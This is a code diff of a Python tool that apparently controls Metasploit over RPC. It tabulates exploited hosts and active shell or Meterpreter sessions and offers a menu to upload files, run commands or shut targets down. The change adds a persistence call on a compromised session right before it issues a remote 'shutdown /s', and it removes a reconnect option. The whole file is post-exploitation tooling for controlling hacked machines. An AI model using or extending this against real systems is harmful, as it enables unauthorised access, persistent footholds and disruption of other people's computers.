@@ -29,10 +29,11 @@ def build_table(client, exploited_hosts, hosts, vulns, sessions):
             client.db.workspaces.workspace('default').hosts.delete(address=host['address'])
     hosts = client.db.workspaces.workspace('default').hosts.list
 
-    for sid, session in sessions.items():
-        if session['tunnel_peer'] not in hosts_real.index.tolist():
-            client.sessions.session(sid).stop()
+    # for sid, session in sessions.items():
+    #     if session['tunnel_peer'] not in hosts_real.index.tolist():
+    #         client.sessions.session(str(sid)).stop()
     sessions = client.sessions.list
+    print(sessions)
     # for sid, session in sessions.items():
     #     exploited_hosts = exploited_hosts.append({
     #         'IP': session['session_host'],
@@ -121,22 +122,7 @@ def main(client: MsfRpcClient):
     :param client:
     :return:
     """
-    # Session - This column refers to the session number. Sessions are assigned a number based on when the session is opened, the first of which is assigned an ID of 1. Clicking Session will allow you to pick which modules to run during the open sessions or use a terminal instead.
-    # OS- Exploited host operating system.
-    # Host - Name of the exploited host. Clicking the host will take you to a details page, where you can see the host status and detailed information about the target host.
-    # Type - The session type opened. The session type will be either a shell or Meterpreter session.
-    # Opened - The date and time the session was opened using format yyyy-mm-dd hr:mm:ss -timezone.
-    # Description - The description of the credential type used to open the session with the host IP address. If the credential type is unknown, this is left blank.
-    # Attack Module - Module used to exploit the target host and open a session. Clicking the module will take you a dedicated page where you can run the module on a target host and see more information about the module.
-    # create table to show all hosts
-    # get all console sessions
-    # consoles = client.consoles.list
-    # printd(consoles)
-    # for console in consoles:
-    #     cid = console['id']
-    #     client.consoles.console(cid).write('sessions -l')
-    #     time.sleep(1)
-    #     printd(client.consoles.console(cid).read())
+    # get all hosts
     exploited_hosts = pandas.DataFrame(columns=['Session ID', 'IP', 'OS', "shell", 'Exploit', 'Status'])
 
     hosts = client.db.workspaces.workspace('default').hosts.list
@@ -181,7 +167,6 @@ def main(client: MsfRpcClient):
                             printd('2. Upload File')
                             printd('3. Run Command')
                             printd('4. Shut Down')
-                            printd('5. Attempt Reconnect')
                             printd('5. Go Back')
                             choice = input('Enter your choice: ')
                             if choice in ['1', '2', '3']:
@@ -221,6 +206,7 @@ def main(client: MsfRpcClient):
                                 go_back = False
                             elif choice == '4':
                                 # shut down
+                                exploit.persist(client, sid)
                                 s.run_with_output('shutdown /s')
                                 time.sleep(1)
                                 out = ''
@@ -231,14 +217,6 @@ def main(client: MsfRpcClient):
                                 # printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
                                 break
                             elif choice == '5':
-                                # attempt reconnect
-                                out = exploit.run_module_with_output(s, s.modules, runoptions=s.modules.runoptions)
-                                s.stop()
-
-                                printd(out)
-                                time.sleep(1)
-                                break
-                            elif choice == '6':
                                 # go back
                                 break
                             elif choice.lower() == 'exit':
@@ -261,24 +239,3 @@ def main(client: MsfRpcClient):
             return f"Error ({type(e)}): {e}"
         else:
             return build_table(client, exploited_hosts, hosts, vulns, sessions)
-
-
-
-
-
-    # # printd sessions
-    # # sessions = pandas.DataFrame(index=range(0, len(client.sessions.list)), columns=['id', 'type', 'info', 'via_payload', 'via_exploit', 'tunnel_peer', 'username', 'uuid', 'exploit_uuid', 'workspace', 'target_host', 'target_port', 'routes', 'arch', 'platform', 'tunnel_local', 'tunnel_peer', 'tunnel_port', 'tunnel_sub', 'tunnel_via_exploit', 'tunnel_via_payload', 'uuid', 'via_exploit', 'via_payload', 'workspace'])
-    # cmd = input("enter a command: ")
-    # printd("Sessions:")
-    # for session in client.sessions.list:
-    #     printd(session)
-    # cid=[c['id'] for c in client.consoles.list]
-    # for c in cid:
-    #     printd(c)
-    #     printd(client.consoles.console(c).read())
-    #     client.consoles.console(c).write(cmd)
-    #     time.sleep(1)
-    #     printd(client.consoles.console(c).read())
-    # console=client.consoles.console(cid)
-
-    # console.read()
